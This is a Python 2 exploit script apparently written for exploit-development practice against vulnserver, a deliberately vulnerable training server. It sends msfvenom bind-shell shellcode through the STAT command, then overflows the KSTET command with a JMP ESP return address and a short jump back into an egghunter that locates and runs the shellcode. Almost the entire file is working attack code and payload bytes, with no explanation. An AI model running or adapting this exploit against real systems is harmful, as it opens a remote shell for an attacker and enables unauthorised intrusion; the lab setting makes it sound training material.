#!/usr/bin/python
import socket
import sys
import os 
host = "192.168.0.25"
port = 9999
#  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\Desktop\vulnserver-master\vulnserver-master\essfunc.dll)
#[+] Egghunter  (32 bytes):
#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
#"\xef\xb8\x52\x4f\x4f\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#Setted ROOT
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x4f\x4f\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

#msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b '\x00' -f c
shellcode = ("\xd9\xc6\xd9\x74\x24\xf4\x5b\xba\x6f\x7e\xe8\x42\x2b\xc9\xb1"
"\x53\x83\xc3\x04\x31\x53\x13\x03\x3c\x6d\x0a\xb7\x3e\x79\x48"
"\x38\xbe\x7a\x2d\xb0\x5b\x4b\x6d\xa6\x28\xfc\x5d\xac\x7c\xf1"
"\x16\xe0\x94\x82\x5b\x2d\x9b\x23\xd1\x0b\x92\xb4\x4a\x6f\xb5"
"\x36\x91\xbc\x15\x06\x5a\xb1\x54\x4f\x87\x38\x04\x18\xc3\xef"
"\xb8\x2d\x99\x33\x33\x7d\x0f\x34\xa0\x36\x2e\x15\x77\x4c\x69"
"\xb5\x76\x81\x01\xfc\x60\xc6\x2c\xb6\x1b\x3c\xda\x49\xcd\x0c"
"\x23\xe5\x30\xa1\xd6\xf7\x75\x06\x09\x82\x8f\x74\xb4\x95\x54"
"\x06\x62\x13\x4e\xa0\xe1\x83\xaa\x50\x25\x55\x39\x5e\x82\x11"
"\x65\x43\x15\xf5\x1e\x7f\x9e\xf8\xf0\x09\xe4\xde\xd4\x52\xbe"
"\x7f\x4d\x3f\x11\x7f\x8d\xe0\xce\x25\xc6\x0d\x1a\x54\x85\x59"
"\xef\x55\x35\x9a\x67\xed\x46\xa8\x28\x45\xc0\x80\xa1\x43\x17"
"\xe6\x9b\x34\x87\x19\x24\x45\x8e\xdd\x70\x15\xb8\xf4\xf8\xfe"
"\x38\xf8\x2c\x6a\x30\x5f\x9f\x89\xbd\x1f\x4f\x0e\x6d\xc8\x85"
"\x81\x52\xe8\xa5\x4b\xfb\x81\x5b\x74\x12\x0e\xd5\x92\x7e\xbe"
"\xb3\x0d\x16\x7c\xe0\x85\x81\x7f\xc2\xbd\x25\x37\x04\x79\x4a"
"\xc8\x02\x2d\xdc\x43\x41\xe9\xfd\x53\x4c\x59\x6a\xc3\x1a\x08"
"\xd9\x75\x1a\x01\x89\x16\x89\xce\x49\x50\xb2\x58\x1e\x35\x04"
"\x91\xca\xab\x3f\x0b\xe8\x31\xd9\x74\xa8\xed\x1a\x7a\x31\x63"
"\x26\x58\x21\xbd\xa7\xe4\x15\x11\xfe\xb2\xc3\xd7\xa8\x74\xbd"
"\x81\x07\xdf\x29\x57\x64\xe0\x2f\x58\xa1\x96\xcf\xe9\x1c\xef"
"\xf0\xc6\xc8\xe7\x89\x3a\x69\x07\x40\xff\x89\xea\x40\x0a\x22"
"\xb3\x01\xb7\x2f\x44\xfc\xf4\x49\xc7\xf4\x84\xad\xd7\x7d\x80"
"\xea\x5f\x6e\xf8\x63\x0a\x90\xaf\x84\x1f")

string = ''
string += 'A' * 23
string += egghunter
string += 'A' *(69-len(string))
string += '\xAF\x11\x50\x62' #JMP ESP 625011af from essfunc.dll
string += '\xEB\xCC'#JMP back 50 bytes
string += 'C'*(1000 - len(string))

#Used to send 2nd stage shellcode
print "[*] Sending 2nd stage exploit ShellCode..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.recv(1024)
s.send("STAT ." + 'ROOTROOT' + shellcode)
s.recv(1024)
s.close()

#Used to send the 1st stage shellcode(egghunter)
print "[*] Sending exploit..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.recv(1024)
s.send("KSTET ." + string)
s.recv(1024)
s.close()
